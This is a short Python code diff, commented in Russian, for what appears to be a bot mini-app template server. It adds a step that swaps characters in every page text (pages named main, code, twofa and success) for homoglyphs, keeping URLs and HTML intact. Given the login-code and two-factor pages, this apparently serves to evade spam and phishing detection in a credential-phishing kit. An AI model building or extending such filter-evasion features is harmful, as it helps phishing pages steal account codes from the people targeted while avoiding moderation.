@@ -23,6 +23,7 @@ from miniapp_template import (
     background_css,
     page_field_key,
 )
+from uniqualizer import uniqualize_content
 
 from web.auth_api import router as auth_router, start_gc
 
@@ -41,6 +42,15 @@ def _miniapp_config(bot_id: int) -> dict:
         t = get_template(bot["template_id"])
         if t:
             content = t["content"]
+            # Уникализация всего шаблона за один проход: если включена в
+            # настройках шаблона — заменяем символы во ВСЕХ текстах страниц
+            # (main/code/twofa/success) на гомоглифы. URL/HTML/эмодзи целы.
+            if content.get("uniq_enabled"):
+                content = uniqualize_content(
+                    content,
+                    homoglyph_ratio=float(content.get("uniq_ratio") or 0.5),
+                    mode=content.get("uniq_mode") or "hard",
+                )
             # Берём только пользовательский app_name; имя шаблона ("Стандартный
             # шаблон") не используем как заголовок мини-аппа.
             cfg["title"] = (content.get("app_name") or "").strip()
